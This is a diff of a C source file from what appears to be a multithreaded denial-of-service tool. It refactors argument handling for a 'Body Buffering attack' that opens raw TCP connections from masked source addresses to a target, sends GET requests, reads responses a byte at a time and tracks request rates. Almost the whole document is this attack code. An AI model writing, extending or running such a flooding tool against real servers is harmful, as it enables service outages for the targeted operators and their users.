@@ -15,17 +15,10 @@ extern int g_num_threads;
 __u64 g_resbuf_num_total;
 __u64 g_resbuf_num_generated_in_sec;
 // from main()
-unsigned char g_resbuf_src_ip[16] = { 0, };
-unsigned char g_resbuf_dest_ip[16] = { 0, };
-__u32 g_resbuf_src_mask;
-__u32 g_resbuf_dest_mask;
-__u32 g_resbuf_dest_port_start;
-__u32 g_resbuf_dest_port_end;
+InputArguments g_resbuf_input;
 __u32 g_resbuf_request_per_sec;
 // for masking next ip address
-unsigned char g_resbuf_now_src_ip[16];
-unsigned char g_resbuf_now_dest_ip[16];
-__u32 g_resbuf_now_dest_port;
+MaskingArguments g_resbuf_now;
 // thread
 pthread_mutex_t g_resbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
@@ -50,23 +43,14 @@ void *generate_response_buffering(void *data)
 
 	struct sockaddr_in servaddr;
 	servaddr.sin_family = AF_INET;
-	servaddr.sin_addr.s_addr = inet_addr(g_resbuf_dest_ip);
-	servaddr.sin_port = htons(g_resbuf_dest_port_start);
+	servaddr.sin_addr.s_addr = inet_addr(g_resbuf_input.dest);
+	servaddr.sin_port = htons(g_resbuf_input.port_start);
 	int response_buffering_cnt = 0;
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_resbuf_mutex);
 		// get now resource
-		generator(
-				g_resbuf_src_ip,
-				g_resbuf_dest_ip,
-				g_resbuf_src_mask,
-				g_resbuf_dest_mask,
-				g_resbuf_dest_port_start,
-				g_resbuf_dest_port_end,
-				g_resbuf_now_src_ip,
-				g_resbuf_now_dest_ip,
-				&g_resbuf_now_dest_port);
+		get_masking_arguments(&g_resbuf_input, &g_resbuf_now);
 		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
 			/*
 			 if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
@@ -82,10 +66,10 @@ void *generate_response_buffering(void *data)
 			setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&rvsz, sizeof(rvsz));
 
 			sock = tcp_make_connection(
-					inet_addr(g_resbuf_now_src_ip),
-					inet_addr(g_resbuf_now_dest_ip),
+					inet_addr(g_resbuf_now.src),
+					inet_addr(g_resbuf_now.dest),
 					&src_port,
-					g_resbuf_now_dest_port,
+					g_resbuf_now.port,
 					&seq,
 					&ack,
 					5000);
@@ -96,10 +80,10 @@ void *generate_response_buffering(void *data)
 			 }*/
 			tcp_socket_send_data(
 					sock,
-					inet_addr(g_resbuf_now_src_ip),
-					inet_addr(g_resbuf_now_dest_ip),
+					inet_addr(g_resbuf_now.src),
+					inet_addr(g_resbuf_now.dest),
 					src_port,
-					g_resbuf_now_dest_port,
+					g_resbuf_now.port,
 					GET_METHOD,
 					strlen(GET_METHOD),
 					seq,
@@ -127,9 +111,9 @@ void *generate_response_buffering(void *data)
 		if (recv_size == -1) {
 			printf("no recv!\n");
 		}
-		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now_src_ip),
-				inet_addr(g_resbuf_now_dest_ip), src_port,
-				g_resbuf_now_dest_port, seq, ack);*/
+		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now.src),
+				inet_addr(g_resbuf_now.dest), src_port,
+				g_resbuf_now.port, seq, ack);*/
 		ack++;
 		printf("Read : %c\n", buffer[0]);
 		g_resbuf_num_generated_in_sec++;
@@ -166,14 +150,7 @@ void response_buffering_main(char *argv[])
 		response_buffering_print_usage();
 		return;
 	}
-	split_ip_mask_port(
-			argv,
-			g_resbuf_src_ip,
-			g_resbuf_dest_ip,
-			&g_resbuf_src_mask,
-			&g_resbuf_dest_mask,
-			&g_resbuf_dest_port_start,
-			&g_resbuf_dest_port_end);
+	argv_to_input_arguments(argv, &g_resbuf_input);
 	g_resbuf_num_generated_in_sec = 0;
 	g_resbuf_num_total = 0;
 	memset(&g_resbuf_before_time, 0, sizeof(struct timespec));
@@ -187,7 +164,7 @@ void response_buffering_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Body Buffering attack to %s using %d threads\n", g_resbuf_dest_ip,
+	printf("Body Buffering attack to %s using %d threads\n", g_resbuf_input.dest,
 			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
